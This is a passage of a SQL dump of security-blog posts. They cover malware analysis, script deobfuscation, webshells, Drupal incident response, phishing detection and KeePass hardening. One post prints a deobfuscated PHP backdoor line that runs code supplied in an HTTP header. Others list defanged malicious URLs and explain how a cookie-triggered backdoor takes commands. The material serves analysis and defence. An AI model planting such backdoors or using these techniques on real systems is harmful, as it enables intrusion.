privilege escalation trick implemented by Beta Bot. I added a screen-dimming feature to make it more convincing.\n\nDeadDrop\nI started off writing a portknocker program that sniffs network traffic to look for a keyword then open up a reverse or bindshell port but I found a better way to achieve the same goal. This program watches various ingress points on the server and executes commands it receives. This is done without using any listening port so monitoring netstat is useless.\nBackdoor Shell Menu\nI wrote a reverse shell and during the exercises, I found myself doing the same commands over and over again. In order to be faster, I built capabilities directly into the shell program itself. Here’s a screenshot of what the menu looks like. Instead of typing a series of commands manually, I just type the menu number plus some required parameters and I’m done.\n\nNetstat Interceptor\nThis program intercepts calls to netstat and can modify or remove anything related to the IP address, port, or PID of my choice. I can do the same thing to tasklist and taskkill.\n\nCapture-The-Flag Jr.\nSince I’ve been involved with cyber exercises lately, I thought I would help teach students about cyber security so I started working on a capture the flag for kids. It’s going to be pretty basic but the idea is to introduce them to various security concepts and get them familiar with security tools like a packet sniffer, hex editor, and Linux commands. It’s going to be self-contained and portable so an instructor can run it in class and pass it to the kids to work on it at home.\n\nFor the time being, you can get the first two programs from the Tools page.', '', 'http://www.kahusecurity.com/?p=13424\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (27, 'Webshell with a Booby Trap', 'darryl', 'July 24, 2015', 'I came across three interesting PHP scripts that were presumably dropped by the same attacker. Perhaps this is old news but it’s something new to me.\nHere’s the first one which looks innocent enough.\n\nHowever, if you put in the wrong password, you can end up at a malicious or phishing page.\n\nhxxp://d.pxer.tk/i.php\nhxxp://a6shd.realshieldlinked.com\nhxxp://zmkzz.allvideos.7664.info\nInspecting the traffic shows that the password you tried gets captured.\n\nHere’s what the panel looks like:\n\nThis is the second script which looks like it failed to do anything:\n\nNope, the script works just fine. It dropped a webshell in the folder.\n\nIf you look closely, you can see that the initial file resembles a JPEG file. The file does open up as a normal graphic but embedded in it are scripts that can execute PHP, ASP, and JSP commands as well as drop a PHP webshell.\n\nThe third script looks like this when you open it in the browser. It’s a seemingly benign page from the PHP Documentation website.\n\nHowever, if you append a certain value to the URL, a hidden feature is enabled at the bottom of the page and you can now upload any file of your choice.\n\nAh, more things to be on the lookout for…', 'backdoors, php scripts, webshells', 'http://www.kahusecurity.com/?p=13412\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (28, 'Converter Updated', 'darryl', 'June 20, 2015', 'The latest version includes several new features which I’d like to highlight here:\nEnhanced Range Search/Replace\nThe feature can be found by going to this menu item under Tools:\n\nYou can now add incrementers as a text replacement as seen in this graphic. Just add ^i if you want to start with 0 or ^I if you want to start with 1. If you check the “Keep Enclosed Contents” box, the “from” and “to” values will be included in the results (inclusive).\n\nThe other option is called “Keep Value From String… and To String…” which just keeps the in-between values.\n\nNew Hashing Algorithms\nAdded new hashing algorithms (credit: Karim Wafi) under the stats menu:\n\nConvert Mixed Format\nI moved the mixed format options from under the Format menu to its own form under the Tools menu. I included examples so you can understand what it’s used for.\n\nI also added a “Mixed Entities to Hex” feature. There’s a button on the main screen called “Decode HTML” to decode HTML entities but if your input string has a mixture of HTML entities and other text, it fails. This feature will convert your input to hex then you can convert it back to text to get your results.\n\nMicrosoft Script Decoder\nMicrosoft Script Encoded strings are now being seen in the wild. I added a script encoder and decoder function in two places (credit: Jean-Luc Antoine and Shawn Stugart).\nIf you have a large file to convert, you can use the Convert Script File option by going here:\n\nThis is the form which allows you to choose an input file, output file, and option. \n\nYour input file you wish to decode needs to contain only the script which starts with #@~^… and ends with ^#[email protected]\n\nIf you have a short string to decode then you can use the Script Encoder/Decoder feature which is located under the Tools menu.\n\nJust paste in the script and make sure it contains the starting and ending key values.\n\nDeobfuscating “Sundown EK”\nNow let’s use some of the features to deobfuscate “Sundown’s” landing pages. Here’s a look at exploit chain in Fiddler (credit: Kafeine):\n\nThe first file is the landing page which looks like this:\n\nPaste that into Converter, choose Tools > Convert Mixed Format, click on the Mixed Entities to Hex option and click on Convert. To makes things a bit easier, choose the “Percent” output format at the bottom. (This saves you from having to do a Format > Hex Format – % in the next step.)\n\nClick on the “Copy Output to Input” button then click on the “Hex to Text” button. Almost done…you can see some hex values in there.\n\nSo click on the “Copy Output to Input” button then click on the “Unescape” button. Now we’re done.\n\nBack to Fiddler…I chose the 10th item called “street4.php.htm”. Here’s what that looks like:\n\nThere’s three scripts on this page. Two are encoded as “JScript.Encode” and the third as “VBScript.Encode”, however, it’s the same encoder. I did the first one above so let me do the second.\n\nClick on “Send Data to Main” then click on the “Unescape” button.\n\nFor the third script, let me paste that into its own file.\n\nI make my selections and click Convert.\n\nAnd we’re done!\n\nHere are the other changes/fixes that were made to Converter:\n\n Update the Beautify JS and HTML function (credit: jsbeautifier.org)\n Correctly rotate non-CSV hex values and the text values in the Key Search/Convert feature\n Clear the output text box when the Import Binary File function starts\n Update the results when the space and colon delimiter options is used in conjunction with Format > Hex function\n Add new input delimiter to Convert Base feature\n Include last value when doing Octal to Hex function\n Add new options colon, space and unicode to Format > Hex Format feature\n\nYou can download Converter here. Thank you for your support!', 'converter, deobfuscation, exploit kit, javascript, microsoft script encoder, sundown', 'http://www.kahusecurity.com/?p=13395\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (29, 'Malicious Word Macro Caught Using Sneaky Trick', 'darryl', 'March 6, 2015', 'There has been a slew of malicious Word documents attached to email purporting to be invoices, receipts, etc. This particular one caught my eye but I’m not sure if this is an old trick. I just haven’t seen this method used before and thought it was quite clever.\nHere’s the email that had a zipped file attached. The zipped file contained a Word document. The email in poor English says, “Thank you for payment. Your invoice…is attached. Thank you for your business – we appreciate it very much.”\n\nOpening the Word document, first thing you’ll notice is the security warning and below it a bunch of garbled text. A message above it says, “If you document have incorrect encoding – enable macro.”\n\nClicking on the “Enable Content” button then reveals the invoice, making this (slightly) more believable and possibly enough to convince the unsuspecting recipient.\n\nUsing OfficeMalScanner, the macros, specifically the one called “ThisDocument” can be dumped to a file for analysis.\n\nLet’s try it with OleDump. It nicely shows the objects inside of the document.\n\nWe can also dump the ‘ThisDocument’ object.\n\nLooking at the macro, we can see a bunch of string concatenation going on and typical garbage in between legitimate VBA code.\n\nA quarter ways in, there’s some URLs to take note of.\n\nBasically the VBA macro builds a VBS script and writes it out.\n\nInterestingly, this VBS calls up a Powershell file. How vogue. It’s now very clear what it’s doing — downloading and executing a file from Internet then downloading an image for statistics and cleaning up.\n\nLet me download the file…\n\nAnd see what VirusTotal has to say…\n\nRegarding that image download, here’s what it is:\n\nThe image’s download stats are in that red box. Not sure how many are victims vs security folks but that could be an impressive number.\n\nGoing back to the macro, I wanted to find out how it “decrypted” the gibberish into text. Near the bottom, I see reference to “findText” and “secondText” followed by some clean-up code.\n\nThe findText subroutine shows that it looks for content between “<select></select>” tags then deletes it.\n\nThe secondText routine looks for “<inbox></inbox>” tags and changes the contents’ font color to black.\n\nAh! It’s not doing any decryption, it’s just some clever sleight of hand. The invoice text was there all along, hidden with white text. Here you can see the hidden content in green.\n\nSneaky indeed.', 'email, invoice, macro, malware, vba, vbs powershell, word document', 'http://www.kahusecurity.com/?p=13368\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (30, 'Deobfuscating a Wicked-Looking Script', 'darryl', 'March 3, 2015', 'Bart Blaze, one of my security researcher friends passed along this PHP script to me. Let’s have a look.\n\nIt looks like PHP ate some Perl and barfed it out. First thing I asked myself is, “does this even run?” It looks like a mess but it actually runs just fine. This script makes clever use of bitwise operators. For example…\n$YzuZ=n ^ ‘)’; // this equates to ‘G’\nTo make this readable, I split everything by semi-colon (except when it’s between quotes). One gotcha is that this script embeds comments (# and /* */) so you have to look very closely and either leave it alone…\n\nOr fix it up…\n\nAfter I cleaned it up, I noticed that the script boils down to the last two lines. So I just echo out each of the important variables:\n\nWhen the script is executed, I get the following values:\n\nNow I just replace the variable names with the corresponding values to get the final result. This creates a function with a value passed via the header (probably includes ‘preg_replace’) which turns this into a well-hidden backdoor.\nif(md5(getenv(HTTP_A)) == 5d15db53a91790e913dc4e05a1319c42) $bIywY=create_function(‘$a, $b, $c’, getenv(HTTP_X_UP_CALLING_LINE_ID));\n$bIywY(x1o6Vm2, WFrkAj9, QcFS0u);\nBe sure you check out Bart’s blog to learn more about this particular script.', 'backdoor, deobfuscation, php obfuscation', 'http://www.kahusecurity.com/?p=13336\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (31, 'Revelo Updated', 'darryl', 'February 15, 2015', 'A colleague of mine received the following email in their Gmail in-box and wondered how it got past their filters and what it does.\n\nWhat almost tricked him was the fact that it called out his name. Only after looking at the originating email address did it make him pause. Good thing they didn’t spoof that. Let’s have a look at the attachment.\n \nIt’s a Javascript file. Malicious scripts are hard to detect because it’s so easy to modify and customize. By the looks of this, it concatenates a value to the variable ‘a’ then jumps to another function. It keeps doing this until the very end then evals it. The problem is trying to find the “end”. Can you find it?\n\nFirst let’s deobfuscate this manually. You will need to find the end of all of the concatenation it’s doing then replace the eval with alert. After spending about a minute of eyeballing the script, I gave up. I did a search for “(a)” and found in the middle.\n\nJust change that to “alert(a)” and execute the file with your browser and you’ll see what it does.\n\nAn easier way is just to append the short script at the end like this. When you run the script, you get the same result as above.\n\nThe deobfuscated script, by the way, makes an AJAX call to a website at tripenjoy.com, downloads a unique file which poses as a JPEG image, renames it as an executable, then runs it.\n\nThe downloaded file is definitely not a JPEG image.\n\nThe payload keeps changing and the latest one I got was a nearly FUD malware according to VirusTotal.\n\nI’ve been meaning to update Revelo and this script prompted me to do it. The latest version allows you to deobfuscate these types of scripts quicker now by doing the same method we used above.\nRun Revelo and paste in the Javascript (or open the file). Revelo needs the “<script></script>” tags so just click on Options > Add Script Tags and it will do so automatically.\n\nChoose the “Append Variable to End” method, type in “a” (the name of the variable we want to view) and click on Execute. Done!\n\nThe second method I added is called “Intercept Return and Variable”. What this will do is intercept a user-specified variable that’s being returned from a function back to the caller.\nHere’s an example. The script below passes a series of numbers to “CRYPT.obfuscate” then onto a “CRYPT.decode” function. The decode function decodes the values, converts it to a string then returns the deobfuscated result which has been highlighted in red.\n\nAll you need to do is select the new method and enter “return output” and click on Execute. Done!\n\nI also added three more options to the menu:\n\n * “Send Results to Prompt when Possible” – will try to display the results in this way: prompt(1,variable).\n * “Use Double Quote” – when trying various methods to deobfuscate a script, inserting single quotes into the script may mess things up so if this option is selected, double quotes will be used instead.\n * “Convert Object to Text” – simply appends “.text” to objects in order to convert them to text where appropriate.\nThe latest version of Revelo is available on the Tools page.', 'deobfuscation, javascript, revelo', 'http://www.kahusecurity.com/?p=13329\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (32, 'Wild Wild West – 12/2014', 'darryl', 'December 13, 2014', 'Added the following packs:\nNull Hole\n“Hanjuan EK”\n“Archie EK”\n“Astrum EK”\n“SedKit”\n“SPL2 Pack”\nSpecial thanks to Kafeine for his valuable input.', '', 'http://www.kahusecurity.com/?p=13309\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (33, 'Registry Dumper – Find and Dump Hidden Registry Keys', 'darryl', 'December 6, 2014', 'The cybercriminals behind Poweliks implemented two clever techniques in their malware. The first was leveraging rundll32.dll to execute Javascript and the second was using a method to hide/protect their registry keys. I’ll be focusing on the second method.\nThe technique of hiding/protecting registry keys using a non-ASCII character goes all the way back to over a decade ago. It’s remarkable in a sense that after all these years, it still works on the latest Windows platform.\nHere we see the built-in Windows Registry Editor choke on the hidden/protected key after infecting the computer with Poweliks.\n\nClicking past the error dialog, you should see something like this. This default key is exposed and fully downloadable/viewable. However, there’s another key that contains the “trigger” that’s not visible.\n\nIf we need to research what this particular malware is doing, we ought to find out what else is hiding there. For that we need to find a tool to help us view these hidden registry keys.\nWith online registry viewers/editors, you can get mixed results. Some seem to work well but lack some basic functionality like exporting keys as text. Others get confused and display the wrong key.\n\n\n\nOffline registry viewers/editors fare much better and offer consistent results. However, you will need to log into a separate account on the computer and use this tool. Or you have to copy the registry off of the infected machine and view it on a computer with the tool installed.\n\nI prefer to do an initial triage on the live machine and get to the data as quickly as possible. Since I couldn’t find a portable, online tool that had the features I wanted, I figure I would try my hand at creating one. The tool is called Registry Dumper and uses a DLL which interacts with the registry via NT native APIs that was written by Hoang Khanh Nguyen.\n\nThis tool allows you to scan for null characters in a given path. It will iterate through the path to find all the keys with nulls in them.\n\nIf you click on the “Show in Hex” checkbox, you can see the key names in hex. Here you will notice that the second entry’s name is “010001” which is equivalent to 0x01 0x00 0x01. This is impossible to view, edit, or delete using the Windows’ Registry Editor.\n\nFrom here you can copy/paste the path over to the left side and dump the keys to a text file.\n\nHere’s the text file containing all the key values in the given path.\n\nWith this tool you can create hidden keys for testing purposes. And if you wanted to delete that impossible-to-remove key, you can use this tool by entering “[x01][null][x01]” as the key name.\n\nThe obfuscated data you see there is the result of running it through Microsoft Script Encoder. To deobfuscate it, you can use an online decoder or download a VBS decoder. A fellow by the name of Lewis E. Moten III wrote a decoder program. I repackaged his function in the following tool.\n\nHere is the decoded version. You will notice that I didn’t have to strip away everything else but the encoded string. The decoder program will look for the start and end markers of the encoded text and replace it with the decoded result.\n\nJust recently, a newer variant of Poweliks was found. It uses a different registry hiding technique based on user permissions. You can read about it here.\nIf you use this tool to access one of these keys, you will get an error message saying that the key doesn’t exist. It does exist but it’s just that it doesn’t have the rights to view it.\n\nHere’s the permission properties of the key using the Windows Registry Editor. Notice that the current user has no read permissions.\n\nYou can still use this tool to dump the keys but you first need to grant permission to the user account that’s running the tool. Just click on the Set Permission to User button and the permission is changed to allow the current user the rights.\n\nNow you can access the key:\n\nHere is the dump of the keys:\n\nAnd the decoded string:\n\nBy the way, that Javascript in the “(Default)” key can be deobfuscated easily using Converter. You will see that the value in between the quotes are shifted over by one character (e.g. the word hello = ifmmp). Just enter the value “-1” and click on the SHIFTx button (or you can click once on the minus button on the right).\n\nYou can download both tools here.', 'poweliks, regdumper, regedit, registry', 'http://www.kahusecurity.com/?p=13303\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (34, 'Securing KeePass with a Second Factor', 'darryl', 'November 26, 2014', 'Cybercriminals are now stealing password managers so it’s time to make them more secure. You can check out this article for details about how it’s being done.\nI wrote this up as a guide to help friends secure their password manager by implementing a second factor. The second factor will come in the form of a USB token that you insert into your computer when you need to run the password manager. If your password manager database and master password gets stolen by Citadel or anything else, criminals won’t be able to open the database without the physical USB token you have in your possession.\nTwo popular password managers are currently being stolen based on the article above — Password Safe and KeePass. There is a nice walkthrough on Yubico’s website on how to enable YubiKey for Password Safe here. YubiKey can also be used to secure LastPass, Passpack, and others.\nGetting YubiKey and KeePass to work was a little tricky so I’ll be describing my experience here.\n\nRequirements\n1. YubiKey made by Yubico\nWhat’s great about the YubiKey hardware is that it supports a number of use cases such as computer logins, disk encryption, and web applications like WordPress, Google, and others. Unfortunately, not all YubiKey hardware supports all applications so be sure you pick up the right YubiKey hardware.\nThere are basically two types of hardware and the one you want to get to protect KeePass will either be the Standard or Neo version. The FIDO U2F Security Key doesn’t appear to support the protocol we need.\n2. YubiKey Personalization Tool\nThis software program will allow you to configure your YubiKey. We will be configuring the second slot since the first slot is apparently reserved according to Yubico’s website — “Re-programming your YubiKey’s 1st configuration slot will overwrite the YubiCloud configuration, and you cannot undo this action!”\n3. KeePass Professional Edition \nYou may need to install Microsoft .NET Framework 2.0+ if it’s not installed already.\n4. KeePass plugin\nYou have a choice between two different security models — One-Time Pad (OTP) and Challenge-Response. Here are the links to the KeePass plugin that you’ll need:\nOtpKeyProv\nKeeChallenge\nIf you decide on the OTP method, you can follow the instructions on Yubico’s website. It works but I had trouble. I had it generate three sets of OTP values which required three button presses on the YubiKey. Using the YubiKey Neo version, it worked most of the time. With the YubiKey Standard version, it rarely worked for some reason. I think it has something to do with how quickly you can press the button to generate the values. Tinkering with the OtpKeyProv settings (e.g. counters, look-ahead windows) did not yield consistent results but YMMV.\nI opted for the Challenge-Response method via KeeChallenge which I’ll be describing here. With KeeChallenge, I didn’t have any problems like I did using the OTP method.\nThe KeeChallenge plugin can be downloaded directly from here. You will also need to download the latest YubiKey-Personalization release (download both Windows 32- and 64-bit versions) from Yubico. This was the part that I got hung up with but a helpful tip on a discussion board provided the solution.\nSetting Up YubiKey\nInstall and run the YubiKey Personalization Tool then plug in the YubiKey into an available USB port.\n\nClick on the Challenge-Response menu item at the top then click on the HMAC-SHA1 button.\n\nClick on the Configuration Slot 2, ensure user input is required, and the fixed 64-byte input is selected. Click on Generate then on the Write Configuration buttons. You should get feedback that the configuration change was successful.\n\nMake sure you copy and backup the secret key you generated! You will need this to setup KeePass as well as to regain access to your database should YubiKey fail for some reason. Store this in a safe place, preferably printed on paper and definitely not stored on the same computer that you’ll be using KeePass on.\nIf you want to set up multiple YubiKeys to work with the same KeePass database, just use the same secret key and write the change to the configuration.\nThat’s it for the YubiKey setup.\nSetting Up KeePass and KeeChallenge\nDownload KeePass as well as the KeeChallenge plugin and Yubico’s YubiKey-Personalization release.\nInstall KeePass and go to the folder. Copy over the files and folders from the KeeChallenge plugin into the KeePass folder so it looks like this (the items in red belong to KeeChallenge):\n\nOpen the folder called “32bit”. See those DLL files? Replace them with the ones from the YubiKey-Personalization files you downloaded (the DLL files are located in the bin folder). Do the same for the 64-bit files.\nStart KeePass and create or open an existing database.\n\nClick on File > Change Master Key. Enter a new master password (twice). Click on the “Key File / Provider” checkbox and choose “Yubikey Challenge-Response”. Click on OK.\n\nYou will be asked for the secret. Paste the secret key you generated when you configured your YubiKey.\n\nYou will then be prompted to plug in your YubiKey if it’s not in already.\n\nTap the button on your YubiKey when you see this prompt on the screen.\n\nSetup is done!\nUsage and Recovery\nTo use KeyPass going forward, enter the password and ensure the Key File option is checked and set to YubiKey Challenge-Response.\n\nInsert your YubiKey and tap on the button to log in.\n\nYou’re in!\n\nIf you lose your YubiKey, it broke, or you just can’t log in using it for whatever reason then unplug it, enter your password, and click OK. You will see this prompt. Choose “Recovery Mode”.\n\nEnter the secret key and click OK.\n\nAnd you’re back in!\n\nYou can feel a little more at ease now while shopping online!', 'keechallenge, keepass, password manager, two-factor, yubikey', 'http://www.kahusecurity.com/?p=13278\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (35, 'Drupal 7 SQL Injection Info', 'darryl', 'November 2, 2014', 'There’s a lot of sites covering this vulnerability but I wanted to document some indicators for anyone who might need it.\nResources\nDrupal Security Advisory\nDrupal Public Service Annoucement\nDrupal Documentation on “Your Drupal Site Got Hacked. Now What?”\nDrupal Site Audit\nVolexity Blog\nSururi Blog\nWhat follows is a brief walk-through of evidence found on a couple of compromised hosts. YMMV.\nIncident Response\nLogging into phpMyAdmin and checking out the “users” table. Two accounts were created. The “drupaldev” account seems to have been found on many compromised hosts.\n\nThere was one host that had hundreds of accounts. What made the malicious accounts stand out was the missing mail field. This would occur if the user could get past the requirement on the registration page or if the account was added directly to the table.\nGoing to the “sessions” table, there’s one entry with the “uid” that matches the account created by the attacker. You can find out the attacker’s IP address this way.\n\nHere’s info on this IP address:\n\nThe firewall logs showed activity over port 8888. If you visit the IP:port, you get this site:\n\nLooking at the webserver logs, we can see POSTs hitting the user/login file on the host. The server 500 errors probably indicate a failed first attempt.\n\nGoing back to phpMyAdmin, a quick search for “.php” was done across all of the tables.\n\nThere was an entry found in the “menu_router” table which seems to be a very common indicator.\n\nClicking on the link, you can download the blob.\n\nGoing to the file system, there is a directory called “README.txt” with a php file inside. The folder and file names appear to be random but the script itself is the same as what others have reported.\nThis PHP script is particularly interesting, it’s a simple backdoor that’s triggered by a cookie. Sucuri covered this awhile ago.\nHere’s a cleaned up version. If you hit the script straightaway, you will get the results of phpinfo(). If you wish to send your own commands, you need to pass three variables. The “Kcqf3” variable contains a value that triggers the script. The second variable “Kcqf2” will be preg_replace. “Kcqf1” contains the command. I imagine the attackers might send commands along the lines of uname, wget, curl, etc.\n\nI wrote a program to craft HTTP requests and can include my own cookie values into the header. Here, I’m sending the phpinfo command and you can see the result in the background. What stands out is its simplicity and cleverness.\n\nYou could create an IDS rule to look for HTTP requests that contain a cookie with the value “preg_replace” and detect/block those coming in. You can then follow up on the targeted host to see if the backdoor is there.\nGood luck!', 'backdoor, cve-2014-3704, drupal, php', 'http://www.kahusecurity.com/?p=13261\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (36, 'Tools Update', 'darryl', 'October 5, 2014', 'No significant updates, just several enhancements and bug fixes to four tools:\nConverter\n– Added new features to Custom PHP Search/Replace\n– Added Convert Word (to decimal) feature\n– Enhanced Key Search/Replace input checking (see Data Converter changes)\n– Improved Beautify Generic routine\n– Updated some labels to provide more clarity\n– Fixed PHP decoder toggle\n– Fixed Base64 by Delimiter option to handle nulls\n– Fixed unescape issue by removing ` replacement\n– Fixed Character Frequency array function to remove last item\n– Fixed Base64 to Text function to properly handle CRLFs\nData Converter\nThanks to Thijs Bosschert for his suggestions. I still need to look into his additional enhancements without slowing things down but for now:\n– Split by single char if key value is text\n– Split every two chars if key value is hex\n– Remove spaces and commas if input value is hex\nScout\n– Added –ignore-ssl-errors=true option to PhantomJS call\nSounder\n– Added –ignore-ssl-errors=true option to PhantomJS call\nThanks for your support!', '', 'http://www.kahusecurity.com/?p=13247\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (37, 'Javascript Deobfuscation Tools Redux', 'darryl', 'September 23, 2014', 'Back in 2011, I took a look at several tools used to deobfuscate Javascript. This time around I will use several popular automated and semi-automated/manual tools to see how they would fare against today’s obfuscated scripts with the least amount of intervention.\nHere are the tools I’ll be testing:\nAutomated\nJSUnpack\nJavascript Deobfuscator (Firefox Add-On) \nSpiderMonkey \nSemi-Automated/Manual\nJSDetox\nJavascript Debugger (all are similar; using Script Debugger for this test): Microsoft Script Debugger, Chrome Developer Tools, Firefox Developer Tools, Firebug (Firefox Add-On)\nRevelo\nHere are the obfuscated scripts:\nSample 1 \nDean Edwards Packer\n\nSample 2\nHiveLogic Enkoder\n\nSample 3\nFor this sample, I used the same original HTML code as the above and obfuscated it using three online obfuscators in the following order: obfuscatorjavascript.com, www.gaijin.at/en/olsjse.php, www.atasoyweb.net/Javascript_Encrypter/javascript_encrypter_eng.php\n\nSample 4\nSpeed-Trap JS\n\nSample 5\nGong Da EK\n\nSample 6\nRIG EK\n\nSample 7\nAngler EK\n\nSample 8\nNuclear EK\n\nPrelude\nMy plan is simple. Use the tools to try to deobfuscate the above scripts without spending more than a few minutes on each one. If I can’t figure it out by making obvious tweaks along the way then I move on. To be honest, I’m no expert with all of these tools so I’m not taking full advantage of its capabilities but this should give you some idea of what you can expect.\nI would encourage you to play along (the scripts are here) . Be sure you do this in a virtual machine because many of the scripts are real and very malicious.\nJSUnpack\nJSUnpack is fully automated and can deal with a lot of scripts except the complex ones.\n\n\n\n\n\n\n\nJavascript Deobfuscator\nThis Firefox add-on is quite robust and also completely automated. Interestingly, it is able to deobfuscate the hard ones but trips up on an easy one. This tool won’t be able to handle scripts that target Internet Explorer for obvious reasons. You might be able to comment out some browser sniffing routines though.\n\n\n\n\n\n\n\n\nSpiderMonkey\nThe SpiderMonkey tool would be similar to using Rhino or V8 engines but Didier Stevens adds some mods that has beefed up SpiderMonkey’s capabilities. DOM-based scripts tend to pose a problem for these engines but you can make several tweaks to the script and define objects to get around this.\n\n\n\n\n\n\n\n\nJSDetox\nThis tool has a lot of capability and potential. The main reason it can’t deob the malicious scripts is probably because I suck at using it.\n\n\n\n\n\n\n\n\nJavascript Debugger\nPretty much all of the Javascript debuggers work the same way so I just lumped them together as a single class of tools. Using a debugger can be slow because you have to follow along with the script and know where to place breakpoints but it is often the most effective way of deobfuscating scripts.\n\n\n\n\n\n\n\n\nRevelo\nI would have hoped my own tool would do pretty well against these scripts and it did. The main challenge with using Revelo is that you need to understand the script you are working on and be able to recognize entry and exit points to inspect. This tool is definitely not for everyone but it has the capability to do just as well as a debugger.\n\n\n\n\n\n\n\n\nConclusion and Scorecard\nAs I mentioned earlier, I’m probably not making the most of every tool as they are quite capable and powerful in their own right. The end result is probably more of a reflection of my abilities rather than the tool so take this with a barrel of salt.', 'debugger, deobfuscator, javascript deobfuscation, jsdetox, jsunpack, revelo, SpiderMonkey', 'http://www.kahusecurity.com/?p=13241\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (38, 'Detecting Phishing Sites in Your Logs', 'darryl', 'September 12, 2014', 'I recently read the Anti-Phishing Working Group’s 2Q 2014 report and saw the number of unique phishing sites. I then compared the numbers with the previous year.\n\nAfter more than 10 years of phishing it’s still around, and growing! Back then, there were companies offering clients a way to detect phishing attacks by analyzing their own web server logs. I wrote my own program in 2006 and decided to update it and offer it up as freeware in case anyone needs a tool like this (I wrote a Python script that does the same thing which I’ll probably push onto Github one day).\nThe idea behind this and other similar tools is to analyze referers in your web server logs. These referers are generated when a user visits a phishing page and submits the form. Upon receiving the user’s credentials, the phishing page will often redirect the user to the legitimate website. The referer will contain the URL of the phishing site.\nIn other phishes, the contents of the phishing page are composed of images, stylesheets, and Javascript from the legitimate site in order to make it look exactly like the original to fool unsuspecting users. Again, we can find out the URL of the phishing page by looking at the referers it generates.\nKeep in mind that if the phishing website is self-contained (that is, does not need any files from the legitimate site) and does not redirect the user back to the legitimate site then there would be no trace in the web server logs.\nLet’s take a look at a typical phish. Here I went to PhishTank.com and try to find a phishing site that’s still up:\n\nHere’s what the site looks like:\n\nWhen I proceeded through the pages where it asks for more and more personal and financial information, I eventually get to the last page:\n\nClicking on the Continue button takes me to the main Paypal site (it’s the Danish version for some reason):\n\nI captured the source code of last phishing page and it looks like this. Notice that it contains links back to the real Paypal site. I’ve highlighted the link to the main logo graphic.\n\nIf we were to look at Paypal’s web server logs, it might look something like this (note the last line). There’s a GET request to the logo graphic and the referer is the URL of last phishing page that called the graphic up.\n\nIf we could find these entries in our log files, we’d find these phishing sites and get them taken down. And we don’t need to rely on users telling us about it. There’s also an added bonus. Sometimes phishers will test their creation first and their referers show up in the logs and we can take down those phishing sites before their phishing campaign can even begin!\nHere’s where the program, Sounder aka FishFinder, comes in:\n\nThe top portion is where you define folders and filenames. You also need to define the column that contains the referer information (be sure your logs contain referer information or this program won’t work!) and line separator. There’s debug modes to help you.\nYou can have it check the Contents of the potential phishing site by scanning for content keywords as defined below. For example, if you enter login, password, email, and username that you see there, the program will check if the website has any of those keywords and tell you if there’s a match on the results file.\nThe Check Filename option will check if the referer contains any of the blacklisted items. The blacklist textbox should contain filenames of known bad referers. In the case of Paypal, it might be something like “paypal.com.html” or “logon.php”. The whitelist textbox would be URLs that you would want to ignore like partner websites, spiders, portals, etc.\nIf the Capture Screen option is set, the program will screenshot the page for visual inspection. This feature requires PhantomJS. I’ve included the required “rasterize.js” file in my download so you just need to copy the PhantomJS executable into the folder.\nFinally, the Server File (Referers) textbox should contain the paths to files on your web server that is often used on phishing pages. Here, I’ve included the path to the logo file.\nYou can save (and load) the settings by clicking on the appropriate buttons on the bottom. The program uses an INI file which contains helpful descriptions and worth looking at before you use the program.\n\nWhen Sounder is run, it will scan the files in the Logs folder and look for any HTTP request matching the items in the “Server Files (Referers)” textbox then inspect the referer. If the referer is known bad then it will automatically flag it. If the referer is on the whitelist, it will ignore it. If the referer is neither good nor bad then it will flag it as suspicious so you can have a chance to inspect it. You should then add the referer to either the white or black list as appropriate for future runs.\nIf the referer is marked suspicious then it will (optionally) visit the page and check if the webpage contents contain any of the items in the “Content Keywords” textbox and grab the screen, regardless of whether there were any keyword matches.\n\nHere’s the results file that shows that this particular referer was suspicious and the keyword “login” was found on the webpage.\n\nThis is the screenshot that PhantomJS captured.\n\nI hope you find this program useful!', 'anti-phishing, log analysis, phishing detection, sounder', 'http://www.kahusecurity.com/?p=13175\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (39, 'A Quick Peek at Network Injection', 'darryl', 'August 20, 2014', 'Like many of you, I’ve been looking at the various NSA document leaks to see what kind of tools and techniques are being used. I suppose these releases will give cybercriminals new ideas and we will see some of these put to nefarious use sooner than later.\nThis particular article was very interesting, especially the concept of network injectors. I’ve heard about EvilGrade but never played with it. It seems as though QUANTUMINSERT and FinFly ISP do something similar.\nI wondered how I could use this for a pentest. Getting inline with my target would be the first challenge. There are several tools I could use to route wired and wireless network traffic to my computer but maybe an easier way is to setup a proxy server then push out a proxy.pac file.\nHere’s a website with a link to a setup file for Revelo.\n\nWhen the user downloads the program, I can see their GET request and response. At this point the program gets downloaded. Here we see excerpts from Paros.\n\nThe way QUANTUMINSERT is described to work, the download request gets silently redirected to another server where an implant gets downloaded. And according to the FinFisher documentation, there is a method called “INJECT-EXE” which “infects the downloaded EXE file in real time. The agent is installed when the target runs the EXE file.” \nThere’s not too much details so I can only infer how this is being done. Maybe they would have pre-downloaded popular programs, binded it with a backdoor, then sent the file over via a forged HTTP redirect. This would allow the user to install the real program with real certificates but have their program run too.\nBut how could you do this in real-time, with any download? If I can write a program that intercepts the GET request to any EXE program, bind it with a backdoor in real-time, update the Content-Length field in the response header, and send the file along…it *should* work. \nAfter some coding, I came up with “Interjector” – Interceptor and Injector (because of the nature of this program I won’t be making this available, sorry). There’s not much to look at I know.\n\nWith Interjector off, when I download the file, it looks like this:\n\nHowever, when 